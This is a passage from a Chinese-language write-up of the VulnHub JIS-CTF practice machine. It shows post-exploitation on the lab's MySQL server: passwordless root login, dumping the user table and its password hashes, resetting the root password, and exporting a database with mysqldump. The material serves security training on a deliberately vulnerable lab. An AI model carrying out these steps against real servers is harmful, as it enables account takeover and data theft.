![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP4MzaTzVMy3PyCrzHIbZmYJjcCFKAy1fvOoDW1ok1y0xbKeHUJvwz3Q/640?wx_fmt=png)

接着新开一个终端 mysql -uroot 无密码登陆即可，但作者总是报错。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPKftQAiavDUgHI1os3SFKEFia5UibbXee4T6qKxJmZr4iam99EBlbLnTCPQ/640?wx_fmt=png)

哎！自己还是太弱了，最后该部分补充 Redwand 老师的成功代码。  
[VulnHub] JIS-CTF - redwand

```
root@Jordaninfosec-CTF01:/tmp# mysql -urootWelcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql>
```

查看数据库如下：

```
mysql> show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)
```

查看 mysql.user 表如下：

```
mysql> select host,user,authentication_string,plugin from user;+-----------+------------------+-------------------------------------------+-----------------------+| host      | user             | authentication_string                     | plugin                |+-----------+------------------+-------------------------------------------+-----------------------+| localhost | root             | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 | mysql_native_password || localhost | mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password || localhost | debian-sys-maint | *C46C96C2990814041379A76A744EE3E5026A0D64 | mysql_native_password |+-----------+------------------+-------------------------------------------+-----------------------+
```

更新 root 密码为 123456 如下：

```
mysql> update user set authentication_string=password("123456") where user="root";Query OK, 0 rows affected, 1 warning (0.00 sec)Rows matched: 1  Changed: 0  Warnings: 1mysql>flush privileges;
```

mysqldump 导出需要的数据库，完成 mysql 脱裤。

```
root@Jordaninfosec-CTF01:/tmp# mysqldump -uroot -p sys > sys.sqlEnter password:
```



参考文章如下。

*   [1] https://www.vulnhub.com
    
*   [2] 教你怎么用 Vulnhub 来搭建环境 - i 春秋老师 F0rmat
    
*   [3] [VulnHub] JIS-CTF - redwand
    
*   [4] OSCP - JIS-CTF-VulnUpload-CTF01 - 青蛙爱轮滑
    
*   [5] JIS-CTF_VulnUpload 靶机攻略 - FreeBuf yangyangwithgnu
    
*   [6] Vulnhub JIS-CTF-VulnUpload 靶机渗透 - A1oe
    
*   [7] vulnhub 靶场渗透学习 - JIS-CTF - Shang176

